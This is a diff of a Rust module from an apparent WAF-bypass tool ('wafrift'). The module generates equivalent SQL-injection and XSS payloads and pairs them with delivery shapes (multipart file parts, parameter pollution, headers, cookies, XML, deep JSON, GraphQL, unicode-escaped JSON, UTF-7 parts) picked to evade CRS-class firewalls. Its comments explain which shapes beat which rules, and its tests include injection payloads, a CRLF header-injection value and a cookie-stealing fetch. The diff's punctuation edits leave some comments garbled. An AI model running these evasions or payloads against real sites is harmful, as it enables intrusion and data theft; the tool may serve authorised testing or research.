@@ -1,4 +1,4 @@
-//! Phase B — the semantic-preserving equivalence-class GENERATOR.
+//! Phase B (the semantic-preserving equivalence-class GENERATOR).
 //!
 //! This is not a fixed list of tricks. It is a rewrite system that
 //! emits an *infinite* space of payloads, every one of which still
@@ -13,10 +13,10 @@
 //! TWO transparent-to-backend axes that produce that disagreement and
 //! they are the *same algebra*:
 //!
-//!  1. **payload-string equivalence** — `UNION/**/SELECT` ≡ `UNION
+//!  1. **payload-string equivalence**: `UNION/**/SELECT` ≡ `UNION
 //!     SELECT` to the SQL parser; `0x61` ≡ `'a'`; an infinite
 //!     grammar-generated tautology family ≡ `1=1`.
-//!  2. **delivery-shape equivalence** — the same logical parameter
+//!  2. **delivery-shape equivalence**: the same logical parameter
 //!     value delivered via a multipart file part / path segment /
 //!     duplicate-param split / JSON-without-Content-Type reaches the
 //!     *same* backend sink, but the WAF inspects it differently.
@@ -49,7 +49,7 @@ pub mod wafmodel;
 pub mod xss;
 pub mod xxe;
 
-/// Deterministic SplitMix64 — reproducible infinite stream, no deps.
+/// Deterministic SplitMix64 (reproducible infinite stream, no deps).
 #[derive(Debug, Clone)]
 pub struct Rng(u64);
 
@@ -75,7 +75,7 @@ impl Rng {
     /// Pick one reference from a non-empty slice.
     ///
     /// # Panics
-    /// Panics if `xs` is empty — all call sites guarantee non-empty inputs.
+    /// Panics if `xs` is empty (all call sites guarantee non-empty inputs).
     /// The old implementation computed `xs.len() - 1` before checking for
     /// emptiness, which in debug builds panics on `0usize - 1` (subtraction
     /// overflow), and in release builds wraps to `usize::MAX` then hits an
@@ -93,7 +93,7 @@ impl Rng {
 /// Collapse runs of whitespace in `s` into single spaces.
 ///
 /// §7 DEDUP + §1 SPEED: `sql::normalize` and `cmd::normalize` both used
-/// `s.split_whitespace().collect::<Vec<_>>().join(" ")` — a Vec allocation
+/// `s.split_whitespace().collect::<Vec<_>>().join(" ")`: a Vec allocation
 /// just to join. This helper folds the words inline with a `String` buffer
 /// using a first-iteration sentinel (`push_str` before the second word),
 /// which avoids the intermediate `Vec<&str>`.
@@ -121,15 +121,15 @@ pub(super) fn collapse_whitespace(s: &str) -> String {
 /// This is the general fix for the substring-containment soundness bug the
 /// per-class equivalence relations shared: a marker `fetch(` was "preserved"
 /// by `prefetch(`, `from` by `fromage`, host `evil.com` by `notevil.com` /
-/// `evil.community` — none of which is the original token. Crucially it is
+/// `evil.community`: none of which is the original token. Crucially it is
 /// edge-AWARE, not a blunt token split:
 ///   - a needle ending in a non-alnum byte (`fetch(`) needs NO right boundary,
 ///     so `fetch(x)` still matches;
 ///   - a needle whose edge is alnum (`evil.com`) DOES need a boundary on that
-///     side, so `www.evil.com` (subdomain — same exfil target) still matches
+///     side, so `www.evil.com` (subdomain, same exfil target) still matches
 ///     (left edge `.` is a boundary) while `notevil.com` / `evil.community`
 ///     are rejected.
-/// All ASCII byte work — callers pass already-normalised (lowercased) strings.
+/// All ASCII byte work (callers pass already-normalised (lowercased) strings).
 #[must_use]
 pub(super) fn contains_token(haystack: &str, needle: &str) -> bool {
     if needle.is_empty() {
@@ -171,12 +171,12 @@ pub enum Dialect {
 /// differently. Every shape is *transparent to the backend sink*.
 /// `Serialize`/`Deserialize` are derived so a chosen delivery shape can
 /// be persisted verbatim in the rule-bypass corpus and reconstructed by
-/// `wafrift harvest` — re-firing the EXACT shape that beat the WAF
+/// `wafrift harvest`: re-firing the EXACT shape that beat the WAF
 /// (not a guess across standard shapes). The default externally-tagged
 /// JSON (`{"Query":{"param":"q"}}`, `"PathSegment"`) round-trips losslessly.
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 pub enum DeliveryShape {
-    /// `?<param>=<payload>` — baseline, fully WAF-inspected.
+    /// `?<param>=<payload>`: baseline, fully WAF-inspected.
     Query { param: String },
     /// `application/x-www-form-urlencoded` body.
     FormBody { param: String },
@@ -189,7 +189,7 @@ pub enum DeliveryShape {
     /// Plain multipart text field.
     MultipartField { name: String },
     /// Multipart **file** part (`filename=…`, part Content-Type).
-    /// CRS excludes upload parts from ARGS SQLi inspection — the
+    /// CRS excludes upload parts from ARGS SQLi inspection, the
     /// single strongest empirical survivor for structured exfil.
     MultipartFile {
         name: String,
@@ -200,15 +200,15 @@ pub enum DeliveryShape {
     /// target ARGS, not the path.
     PathSegment,
     /// HTTP-Parameter-Pollution last-occurrence evasion:
-    /// `?<p>=v0&<p>=v1&…&<p>=<payload>` — `parts` benign decoy values
+    /// `?<p>=v0&<p>=v1&…&<p>=<payload>`: `parts` benign decoy values
     /// precede the intact payload, which is carried whole in the LAST
     /// occurrence. WAFs that inspect only the first occurrence (or
     /// score each occurrence independently) miss it; the payload is
     /// never split. Sound on last-occurrence-wins backends (PHP
     /// `$_GET`, Express, Spring `@RequestParam`, Rails); NOT sound on
-    /// first-wins or value-concatenating (legacy ASP.NET) backends —
+    /// first-wins or value-concatenating (legacy ASP.NET) backends 
     /// the recovered value there is not the original payload. (The
-    /// decoys are throwaway markers, never fragments of the payload —
+    /// decoys are throwaway markers, never fragments of the payload 
     /// this is deliberately NOT a payload-splitting/concat technique.)
     HppSplit { param: String, parts: usize },
     /// Payload as a **request header** value (e.g. `X-Forwarded-Host`,
@@ -216,7 +216,7 @@ pub enum DeliveryShape {
     /// XSS from them; CRS's `REQUEST_HEADERS` XSS coverage at PL1 is
     /// weaker than its ARGS coverage. Transparent to the backend *iff
     /// the app reflects that header* (the same conditional transparency
-    /// as `PathSegment`). Only sound for payloads with no CR/LF/NUL —
+    /// as `PathSegment`). Only sound for payloads with no CR/LF/NUL 
     /// see [`DeliveryShape::transport_legal`].
     HeaderValue { name: String },
     /// Payload as a **cookie** value (`Cookie: <name>=<payload>`).
@@ -224,18 +224,18 @@ pub enum DeliveryShape {
     /// distinct WAF inspection surface from ARGS. Transparent to the
     /// backend *iff the app reflects that cookie*. Only sound for
     /// payloads that are valid RFC 6265 cookie-octets (no CR/LF/NUL,
-    /// `;`, `,`, whitespace, DQUOTE, backslash) — see
+    /// `;`, `,`, whitespace, DQUOTE, backslash), see
     /// [`DeliveryShape::transport_legal`]; the generator never pairs an
     /// illegal payload with this shape.
     Cookie { name: String },
-    /// XML POST body — `<root><field>PAYLOAD</field></root>` with the
+    /// XML POST body: `<root><field>PAYLOAD</field></root>` with the
     /// payload XML-entity-escaped inside the text node. CRS body
     /// inspectors at PL1 focus on ARGS + JSON; XML is the third axis
     /// and is the most weakly covered (no `application/xml` parser
     /// fans out into ARGS_NAMES/ARGS the way `application/json` does
     /// with `tx.json_request_body_processor`). Transparent to the
     /// backend iff the app parses XML and sinks the inner text node
-    /// — a SOAP, RSS, or content-negotiating endpoint. Always legal
+    ///: a SOAP, RSS, or content-negotiating endpoint. Always legal
     /// for any payload because the renderer escapes `<`/`>`/`&`/`"`
     /// before they reach the wire (backend re-decodes them, sink sees
     /// the exact bytes).
@@ -250,7 +250,7 @@ pub enum DeliveryShape {
     /// `tx.json_max_depth` body inspector at 5 by default; payloads
     /// beyond that fall outside the rule scope while the backend's
     /// JSON parser is unbounded. Transparent to the backend iff it
-    /// traverses the same depth to read the value — common in
+    /// traverses the same depth to read the value, common in
     /// nested-resource APIs (`POST /items` with deep filter trees) or
     /// any framework auto-binding nested fields. JSON-escaped at the
     /// renderer so any payload is legal.
@@ -267,11 +267,11 @@ pub enum DeliveryShape {
     /// payload carried as a JSON-string variable:
     /// `{"query":"query Q($v:String!){<field>(q:$v){...}}",
     ///   "variables":{"<var>":"PAYLOAD"}}`. CRS PL1 has no GraphQL
-    /// parser — the body is a JSON envelope and the payload is one of
+    /// parser, the body is a JSON envelope and the payload is one of
     /// many string values inside `variables`, so an ARGS-scoped or
     /// JSON-fixed-path rule misses it. Transparent to the backend iff
     /// the GraphQL resolver dispatches the named field and reflects
-    /// the variable value (the GraphQL XSS class — `search(q:$v)` →
+    /// the variable value (the GraphQL XSS class: `search(q:$v)` →
     /// `$v` rendered into HTML somewhere). JSON-escaped at the
     /// renderer so any payload is legal.
     GraphQLQuery {
@@ -286,13 +286,13 @@ pub enum DeliveryShape {
     /// `\uXXXX` escape: `{"<param>":"union…"}`.
     /// RFC 8259 §7 REQUIRES a conformant JSON parser to decode `\uXXXX`
     /// to its code point, so the backend recovers the payload byte-for-byte
-    /// — while a WAF byte-scanning the body sees only `\u…` runs and
+    ///: while a WAF byte-scanning the body sees only `\u…` runs and
     /// matches none of the attack's keywords (`union`, `<script`, `passwd`).
     /// This is the JSON-unicode-normalisation gap: most WAFs keyword-match
     /// the raw body and never JSON-decode it, but every backend JSON
     /// deserialiser does. ALWAYS legal for any payload (full escaping can
     /// never forge transport structure). Sound iff the app parses the body
-    /// as JSON and sinks the value — so the renderer MUST send
+    /// as JSON and sinks the value, so the renderer MUST send
     /// `Content-Type: application/json` (without it the backend keeps the
     /// literal `\u…` and the sink sees the wrong bytes).
     JsonUnicodeBody {
@@ -301,19 +301,19 @@ pub enum DeliveryShape {
     },
     /// Multipart field part whose body is the payload UTF-7-encoded
     /// (RFC 2152), with the part header `Content-Type: text/plain;
-    /// charset=utf-7`. The SYNTAX metacharacters a signature anchors on —
-    /// `<`, `>`, `=`, space, `"` — are non-direct in RFC 2152 and become
+    /// charset=utf-7`. The SYNTAX metacharacters a signature anchors on 
+    /// `<`, `>`, `=`, space, `"`: are non-direct in RFC 2152 and become
     /// `+…-` shift sequences (`<script>` → `+ADw-script+AD4-`), so the WAF
     /// matches none of them as literal bytes; a backend that honours the
     /// per-part charset decodes it back to the exact payload. (Keyword
-    /// IDENTIFIERS — alnum plus `()'` — are direct and remain literal, so
+    /// IDENTIFIERS, alnum plus `()'`: are direct and remain literal, so
     /// this defeats syntax-anchored rules, not bare-word rules.) This is the
     /// charset-confusion class (terjanq double-charset, CVE-2026-21876's
-    /// per-part charset gap). Always transport-legal — the UTF-7 output is
+    /// per-part charset gap). Always transport-legal, the UTF-7 output is
     /// pure ASCII and the multipart boundary is chosen to never collide with
     /// it. Soundness is CONDITIONAL: transparent ONLY iff the backend honours
     /// `charset=utf-7` on the part (legacy IIS/.NET and CVE-2026-21876-class
-    /// parsers) — narrower than the spec-guaranteed shapes, so it is the
+    /// parsers), narrower than the spec-guaranteed shapes, so it is the
     /// operator's deliberate pick for a UTF-7-decoding target.
     Utf7MultipartField {
         /// Multipart field name.
@@ -346,7 +346,7 @@ impl DeliveryShape {
     /// forging transport structure* (header/cookie injection, request
     /// smuggling). For every encoding shape (query/form/json/multipart/
     /// path/hpp) the payload is percent-/JSON-/multipart-escaped so the
-    /// backend recovers the exact bytes — always legal. For the raw
+    /// backend recovers the exact bytes, always legal. For the raw
     /// channels (`HeaderValue`, `Cookie`) we MUST NOT encode (the
     /// backend XSS sink must see the literal bytes), so the payload
     /// itself must already be legal in that transport position. The
@@ -358,10 +358,10 @@ impl DeliveryShape {
         match self {
             Self::HeaderValue { .. } => {
                 // RFC 9110 §5.5: CR/LF/NUL terminate or split the header.
-                // ALSO — recipients strip leading/trailing OWS (SP/HTAB)
+                // ALSO, recipients strip leading/trailing OWS (SP/HTAB)
                 // from a field value before processing, so a payload
                 // that begins or ends with SP/HTAB would reach the app
-                // *trimmed* (≠ member.payload) — that is unsound, reject
+                // *trimmed* (≠ member.payload), that is unsound, reject
                 // it. Interior SP and `<` `>` `"` are legal field-value
                 // octets and arrive verbatim.
                 let bytes = payload.as_bytes();
@@ -372,7 +372,7 @@ impl DeliveryShape {
             Self::Cookie { .. } => {
                 // RFC 6265 cookie-octet: %x21 / %x23-2B / %x2D-3A /
                 // %x3C-5B / %x5D-7E. Excludes CTL, SP, DQUOTE, comma,
-                // semicolon, backslash — any of which would split the
+                // semicolon, backslash, any of which would split the
                 // cookie or forge a new one.
                 !payload.is_empty()
                     && payload.bytes().all(|b| {
@@ -411,13 +411,13 @@ pub struct EquivPayload {
 /// Generator configuration.
 #[derive(Debug, Clone)]
 pub struct EquivConfig {
-    /// Deterministic seed — same seed ⇒ same stream.
+    /// Deterministic seed (same seed ⇒ same stream).
     pub seed: u64,
     /// How many members to draw from the (infinite) class.
     pub max: usize,
     /// Re-verify every member against the structural-preservation
     /// invariant before yielding (defaults on; never disable for real
-    /// runs — it is the anti-rig guarantee).
+    /// runs (it is the anti-rig guarantee)).
     pub verify: bool,
     /// Also vary the delivery shape (the joint algebra). When false,
     /// only payload-string equivalence is explored.
@@ -431,7 +431,7 @@ pub struct EquivConfig {
     pub force_delivery: Option<usize>,
 }
 
-/// Default deterministic seed — ASCII "wafrift!".
+/// Default deterministic seed: ASCII "wafrift!".
 pub const DEFAULT_SEED: u64 = 0x7761_6672_6966_7421;
 
 /// Attempt-budget multiplier for the randomised equivalence-class sampling
@@ -508,12 +508,12 @@ pub fn equiv_for(class: &str, payload: &str, cfg: &EquivConfig) -> Vec<EquivPayl
 // Delivery-aware public API (the surface scald consumes for XSS).
 //
 // The honest lever for XSS-vs-WAF is NOT payload-string obfuscation
-// (a CRS-class WAF normalises every encoding) — it is DELIVERY SHAPE:
+// (a CRS-class WAF normalises every encoding), it is DELIVERY SHAPE:
 // the same sound payload delivered via a multipart file part / path
 // segment / JSON-without-Content-Type reaches the backend sink while
 // the WAF inspects it differently. This renders an [`EquivPayload`]'s
 // `(payload × delivery)` into a transport-neutral [`wafrift_types::
-// Request`] that ANY consumer (scald, the proxy, the CLI) can send —
+// Request`] that ANY consumer (scald, the proxy, the CLI) can send 
 // one single source of truth for the joint algebra.
 // ─────────────────────────────────────────────────────────────────────
 
@@ -541,7 +541,7 @@ fn json_escape(s: &str) -> String {
 /// emitted as a `\uXXXX` escape (BMP scalars direct; astral scalars as a
 /// UTF-16 surrogate pair, exactly as a compliant encoder would). RFC 8259
 /// §7 mandates a conformant parser decode each `\uXXXX` to its code point,
-/// so the backend recovers `s` byte-for-byte — while a WAF byte-scanning
+/// so the backend recovers `s` byte-for-byte, while a WAF byte-scanning
 /// the body matches none of the attack's keywords. Powers
 /// [`DeliveryShape::JsonUnicodeBody`]; always produces a valid JSON
 /// string body regardless of payload bytes (so the shape is always
@@ -580,10 +580,10 @@ fn effective_boundary(parts: &[&str]) -> String {
 }
 
 /// SOUNDNESS GATE for the joint `(payload × delivery)` algebra. A
-/// member whose payload cannot legally occupy its delivery channel —
+/// member whose payload cannot legally occupy its delivery channel 
 /// a raw `HeaderValue`/`Cookie` payload carrying bytes (`CR`/`LF`/
 /// `NUL`/`;`/space/…) that [`DeliveryShape::to_request`] would have to
-/// strip — is NOT an equivalent rewrite: what reaches the backend
+/// strip, is NOT an equivalent rewrite: what reaches the backend
 /// would differ from `member.payload`, so verifying against
 /// `member.payload` would be a rig. Drop it. This runs at the tail of
 /// EVERY per-class generator, so the invariant holds for all classes
@@ -619,7 +619,7 @@ fn url_with_path_segment(target: &str, raw_seg: &str) -> String {
 }
 
 /// Strip the bytes that could break out of an HTTP header line or a
-/// quoted multipart parameter: CR, LF, NUL — plus any caller-supplied
+/// quoted multipart parameter: CR, LF, NUL, plus any caller-supplied
 /// `extra` forbidden chars (`;` for a `Cookie` pair, `"`/`\` for a quoted
 /// `Content-Disposition` param). Render-side defense-in-depth: provably a
 /// no-op on generator-produced members (they carry only safe ASCII), but
@@ -673,7 +673,7 @@ impl DeliveryShape {
                 // Value fully `\uXXXX`-escaped; key plain. Content-Type is
                 // MANDATORY here (unlike JsonBody's optional/omitted mode):
                 // the backend must parse the body as JSON to decode the
-                // escapes, else the sink would see literal `\u…` — unsound.
+                // escapes, else the sink would see literal `\u…`: unsound.
                 let body = format!(
                     "{{\"{}\":\"{}\"}}",
                     json_escape(param),
@@ -807,7 +807,7 @@ impl DeliveryShape {
                 req
             }
             Self::GraphQLQuery { field, var } => {
-                // Same sanitization for the GraphQL identifier names —
+                // Same sanitization for the GraphQL identifier names 
                 // attacker bytes there would mis-parse the query.
                 let f_safe = sanitize_graphql_name(field, "search");
                 let v_safe = sanitize_graphql_name(var, "v");
@@ -826,7 +826,7 @@ impl DeliveryShape {
     }
 }
 
-/// XML 1.0 text-node escape — replaces `&`, `<`, `>` with their
+/// XML 1.0 text-node escape, replaces `&`, `<`, `>` with their
 /// canonical entity references so the payload bytes round-trip
 /// through any conformant XML parser as the original text node.
 /// `"` is also escaped though our renderer never places the payload
@@ -892,7 +892,7 @@ fn sanitize_graphql_name(s: &str, fallback: &str) -> String {
 /// scald's XSS entrypoint: the sound `(payload × delivery)` XSS
 /// equivalence class for `payload`. Each member still executes the
 /// original script (verified by the generator) AND carries the
-/// delivery shape that slips a WAF — render it with
+/// delivery shape that slips a WAF, render it with
 /// [`DeliveryShape::to_request`]. Deterministic; `max` members.
 #[must_use]
 pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
@@ -905,7 +905,7 @@ pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
     xss::generate(payload, &cfg)
 }
 
-/// Shared test helper — builds a deterministic [] for unit
+/// Shared test helper, builds a deterministic [] for unit
 /// tests in the equiv sub-modules.
 ///
 /// Parameters preserve per-module defaults exactly as they were before
@@ -952,7 +952,7 @@ mod contains_token_tests {
 
     #[test]
     fn underscore_and_dot_count_as_boundaries() {
-        // `_` is NOT alphanumeric, so it IS a boundary — `from` survives
+        // `_` is NOT alphanumeric, so it IS a boundary: `from` survives
         // next to `_clause`. (This matches the existing SQL behaviour where
         // identifiers split on non-alnum.)
         assert!(contains_token("from_clause select 1", "from"));
@@ -974,7 +974,7 @@ mod contains_token_tests {
     #[test]
     fn marker_ending_in_non_alnum_needs_no_right_boundary() {
         // `fetch(` ends in `(` (non-alnum), so its right side needs no
-        // boundary — `fetch(x)` matches. But its left `f` is alnum, so
+        // boundary: `fetch(x)` matches. But its left `f` is alnum, so
         // `prefetch(` (left-buried) is rejected.
         assert!(contains_token("fetch(document.cookie)", "fetch("));
         assert!(!contains_token("prefetch(document.cookie)", "fetch("));
@@ -989,7 +989,7 @@ mod contains_token_tests {
 
     #[test]
     fn repeated_occurrences_one_buried_one_clean() {
-        // first occurrence buried (`fromage`), second clean (`from `) — must
+        // first occurrence buried (`fromage`), second clean (`from `), must
         // still match because SOME occurrence is a whole token.
         assert!(contains_token("fromage and from users", "from"));
     }
@@ -1128,7 +1128,7 @@ mod delivery_api_tests {
 
         // Security property = no CRLF-delimited header/part can be forged.
         // After the strip the injected text may survive INLINE inside the
-        // quoted value (harmless — it's one line), so we assert on the
+        // quoted value (harmless, it's one line), so we assert on the
         // CRLF-prefixed header markers, not bare substrings.
         let evil = DeliveryShape::MultipartField {
             name: "f\"\r\nContent-Disposition: form-data; name=\"evil".into(),
@@ -1173,13 +1173,13 @@ mod delivery_api_tests {
         // The Phase-C bandit sets `force_delivery: Some(i)` to index
         // `delivery_set`, and `delivery_kind_label(i)` names that arm
         // for reward attribution. The contract is NOT label-string
-        // equality with `DeliveryShape::label()` — `delivery_kind_label`
+        // equality with `DeliveryShape::label()`: `delivery_kind_label`
         // is deliberately FINER (it splits JSON into `json_no_ct` vs
         // `json_ct`, which `label()` collapses to `json_body`). The
         // invariants that actually prevent mis-rewarded arms are:
         let set = super::sql::delivery_set("q");
 
-        // (1) Every shape has its OWN reward bucket — `delivery_kind_
+        // (1) Every shape has its OWN reward bucket: `delivery_kind_
         //     label` must be injective over the live index range, or
         //     two shapes share a bandit arm and the search is blind.
         let names: Vec<_> = (0..set.len())
@@ -1189,7 +1189,7 @@ mod delivery_api_tests {
         assert_eq!(
             uniq.len(),
             set.len(),
-            "delivery_kind_label collides over 0..{} ({names:?}) — \
+            "delivery_kind_label collides over 0..{} ({names:?}). \
              two delivery shapes reward the same bandit arm",
             set.len()
         );
@@ -1210,18 +1210,18 @@ mod delivery_api_tests {
         }
 
         // (3) The new raw channels were APPENDED at the tail (indices
-        //     8/9) so every pre-existing `force_delivery` index — and
-        //     any persisted Phase-C bandit state — still points at the
+        //     8/9) so every pre-existing `force_delivery` index, and
+        //     any persisted Phase-C bandit state, still points at the
         //     same shape it did before this change.
         assert_eq!(set.len(), 15);
         // The Phase-C bandit is `Bandit::new(DELIVERY_ARMS)`. If this
         // drifts below `delivery_set().len()` the trailing arms are
-        // NEVER explored — the new channels would be dead in the
+        // NEVER explored, the new channels would be dead in the
         // adaptive scan path even though they render correctly.
         assert_eq!(
             super::sql::DELIVERY_ARMS,
             set.len(),
-            "DELIVERY_ARMS ({}) != delivery_set len ({}) — Phase-C \
+            "DELIVERY_ARMS ({}) != delivery_set len ({}). Phase-C \
              bandit cannot reach the tail delivery shapes",
             super::sql::DELIVERY_ARMS,
             set.len()
@@ -1230,7 +1230,7 @@ mod delivery_api_tests {
         assert!(matches!(set[9], DeliveryShape::Cookie { .. }));
         // New shapes APPENDED at 10/11/12 so existing persisted bandit
         // state still indexes the same shapes it did before this change
-        // (LAW 2 — pre-existing reward distributions stay valid).
+        // (LAW 2 (pre-existing reward distributions stay valid)).
         assert!(matches!(set[10], DeliveryShape::XmlBody { .. }));
         assert!(matches!(set[11], DeliveryShape::JsonNestedDeep { .. }));
         assert!(matches!(set[12], DeliveryShape::GraphQLQuery { .. }));
@@ -1324,7 +1324,7 @@ mod delivery_api_tests {
         assert!(!hv.transport_legal("a\0b"));
         // RFC 9110 §5.5: recipients strip leading/trailing OWS, so an
         // edge-whitespace payload would arrive TRIMMED (≠ member.payload)
-        // — must be rejected as unsound, not "usually fine".
+        //: must be rejected as unsound, not "usually fine".
         assert!(!hv.transport_legal(" <svg>"), "leading SP would be trimmed");
         assert!(
             !hv.transport_legal("<svg> "),
@@ -1346,7 +1346,7 @@ mod delivery_api_tests {
         assert!(!ck.transport_legal("a\"b"));
         assert!(!ck.transport_legal("a\\b"));
         assert!(!ck.transport_legal(""));
-        // Encoding shapes recover exact bytes — always legal.
+        // Encoding shapes recover exact bytes (always legal).
         for d in [
             DeliveryShape::Query { param: "q".into() },
             DeliveryShape::PathSegment,
@@ -1362,7 +1362,7 @@ mod delivery_api_tests {
     #[test]
     fn generator_never_pairs_illegal_payload_with_raw_channel() {
         // Every Cookie/Header member the XSS generator yields must be
-        // transport-legal for its channel AND still execute the script —
+        // transport-legal for its channel AND still execute the script 
         // the delivery-axis anti-rig at the generator boundary.
         for atk in [
             "<svg onload=alert(1)>",
@@ -1499,12 +1499,12 @@ mod rng_tests {
     }
 }
 
-/// ROUND-TRIP SOUNDNESS — the load-bearing invariant of the entire
+/// ROUND-TRIP SOUNDNESS, the load-bearing invariant of the entire
 /// `(payload × delivery)` algebra: whatever shape the payload is
 /// delivered in, a conforming backend MUST recover the *exact same
 /// bytes*. If any shape silently mangles the value (the class of bug
 /// the earlier param-name-not-encoded defect belonged to), the WAF
-/// might be bypassed but the exploit no longer fires — an unsound,
+/// might be bypassed but the exploit no longer fires, an unsound,
 /// rigged "bypass". Every assertion decodes the rendered request the
 /// way a real backend would and demands byte-equality.
 #[cfg(test)]
@@ -1529,7 +1529,7 @@ mod delivery_roundtrip_tests {
             .collect()
     }
 
-    /// Minimal RFC 8259 JSON string-content unescaper — enough to
+    /// Minimal RFC 8259 JSON string-content unescaper, enough to
     /// invert `json_escape` (and then some, for robustness).
     fn json_unescape(s: &str) -> String {
         let b: Vec<char> = s.chars().collect();
@@ -1618,7 +1618,7 @@ mod delivery_roundtrip_tests {
                 }
                 .to_request(t, p);
                 let jbody = String::from_utf8(jb.body.clone().unwrap_or_default()).unwrap();
-                // {"<k>":"<v>"} — strip the structural frame, unescape.
+                // {"<k>":"<v>"} (strip the structural frame, unescape).
                 let inner = jbody
                     .strip_prefix('{')
                     .and_then(|s| s.strip_suffix('}'))
@@ -1712,7 +1712,7 @@ mod delivery_roundtrip_tests {
 
     /// Pins the documented backend-model dependence of `HppSplit`
     /// (now stated truthfully on the variant): the payload is whole in
-    /// the LAST occurrence with benign decoys before it — sound on
+    /// the LAST occurrence with benign decoys before it, sound on
     /// last-wins backends, and explicitly NOT a payload-split/concat
     /// technique. A regression that started fragmenting the payload
     /// across occurrences (resurrecting the old, wrong "concat" doc)
@@ -1734,13 +1734,13 @@ mod delivery_roundtrip_tests {
         for d in &vs[..3] {
             assert!(
                 !payload.contains(d.as_str()) && d.starts_with('v'),
-                "decoy {d:?} is a payload fragment — concat-splitting regressed"
+                "decoy {d:?} is a payload fragment, concat-splitting regressed"
             );
         }
         // First-wins backend would see a benign decoy (evasion-safe,
-        // exploit-inert) — never a partial payload.
+        // exploit-inert) (never a partial payload).
         assert_eq!(vs.first().unwrap(), "v0");
-        // Concatenating backend would see decoys glued to the payload —
+        // Concatenating backend would see decoys glued to the payload 
         // i.e. NOT the original. This is the documented unsound case;
         // asserting it keeps the variant doc honest.
         assert_ne!(vs.concat(), payload);
@@ -1763,14 +1763,14 @@ mod delivery_roundtrip_tests {
             let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
             assert!(body.contains("<?xml"), "XML prolog missing");
             assert!(ct(&r).contains("application/xml"));
-            // <q>...</q> — extract inner text and entity-decode.
+            // <q>...</q> (extract inner text and entity-decode).
             let (_, after_open) = body.split_once("<q>").expect("inner field open tag");
             let (text, _) = after_open
                 .split_once("</q>")
                 .expect("inner field close tag");
             assert_eq!(xml_text_unescape(text), p, "XmlBody mangled {p:?}");
             // Anti-rig: the structural HTML-tag bytes (the WAF's actual
-            // signature surface — `<…>`) must NOT reach the wire
+            // signature surface: `<…>`) must NOT reach the wire
             // un-escaped. Pure JS substrings like `onload=` carry no
             // angle bracket so they need no escaping; the WAF rule
             // chain for XSS keys on the `<tag …>` framing which we
@@ -1780,7 +1780,7 @@ mod delivery_roundtrip_tests {
                 if p.contains(tag) {
                     assert!(
                         !text.contains(tag),
-                        "{tag} reached the wire un-escaped — WAF would see it"
+                        "{tag} reached the wire un-escaped. WAF would see it"
                     );
                 }
             }
@@ -1803,7 +1803,7 @@ mod delivery_roundtrip_tests {
             "hostile root forged <script> tag: {body}"
         );
         // The XML prolog legitimately contains `"` for its version /
-        // encoding attribute values — the assertion is that hostile
+        // encoding attribute values, the assertion is that hostile
         // bytes do not reach an ELEMENT name position. Slice past the
         // prolog and check there.
         let after_prolog = body.split_once("?>").map(|(_, x)| x).unwrap_or(&body);
@@ -1860,7 +1860,7 @@ mod delivery_roundtrip_tests {
         }
         .to_request("http://h/app", "x");
         let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
-        // At depth 64 the body is < 1 KB — bounded as advertised.
+        // At depth 64 the body is < 1 KB (bounded as advertised).
         assert!(
             body.len() < 4096,
             "depth cap not enforced; body is {} bytes",
@@ -1875,7 +1875,7 @@ mod delivery_roundtrip_tests {
     #[test]
     fn graphql_query_recovers_exact_payload_in_variables() {
         // The contract: GraphQL resolvers receive `variables.<var>` as
-        // the original string value — JSON-escaped on the wire, decoded
+        // the original string value: JSON-escaped on the wire, decoded
         // by the GraphQL JSON envelope parser at the resolver boundary.
         for &p in PAYLOADS {
             let r = DeliveryShape::GraphQLQuery {
@@ -1902,7 +1902,7 @@ mod delivery_roundtrip_tests {
     fn json_unicode_body_recovers_exact_bytes_via_real_parser() {
         // SOUNDNESS: an actual RFC-8259 parser (serde_json, standing in for
         // the backend deserialiser) must recover the payload byte-for-byte
-        // from the fully `\uXXXX`-escaped value — for EVERY corpus member,
+        // from the fully `\uXXXX`-escaped value, for EVERY corpus member,
         // including multibyte/astral ones (surrogate-pair path).
         for &p in PAYLOADS {
             let r =
@@ -1926,7 +1926,7 @@ mod delivery_roundtrip_tests {
     fn json_unicode_body_hides_keywords_in_cleartext() {
         // EVASION: the attack keywords must not appear verbatim on the wire
         // (every char is `\u`-escaped), so a WAF byte-scanning the JSON body
-        // matches nothing — yet the parser above proves the backend recovers
+        // matches nothing, yet the parser above proves the backend recovers
         // the exact attack.
         let atk = "1 UNION SELECT password FROM users-- ";
         let r =
@@ -1978,11 +1978,11 @@ mod delivery_roundtrip_tests {
     #[test]
     fn utf7_multipart_hides_structural_metachars_on_the_wire() {
         // EVASION (accurately scoped): UTF-7 shift-encodes the SYNTAX
-        // metacharacters a WAF signature anchors on — `<`, `>`, `=`, space,
-        // `"` are all non-direct in RFC 2152 and become `+…-` sequences — so
+        // metacharacters a WAF signature anchors on: `<`, `>`, `=`, space,
+        // `"` are all non-direct in RFC 2152 and become `+…-` sequences, so
         // `<script`, `=`, and the tag close never appear as literal bytes.
         // It does NOT hide keyword IDENTIFIERS (alnum + `()'` are direct), so
-        // `script`/`alert` may remain — UTF-7 defeats syntax-anchored rules,
+        // `script`/`alert` may remain: UTF-7 defeats syntax-anchored rules,
         // not bare-word rules. That honest scoping is the point.
         let atk = "<script>alert(1)</script>";
         let r =
@@ -2031,7 +2031,7 @@ mod delivery_roundtrip_tests {
         );
     }
 
-    /// Inverse of `xml_text_escape` — minimal entity decoder for the
+    /// Inverse of `xml_text_escape`: minimal entity decoder for the
     /// five entities we emit. Anything else passes through verbatim.
     fn xml_text_unescape(s: &str) -> String {
         s.replace("&lt;", "<")
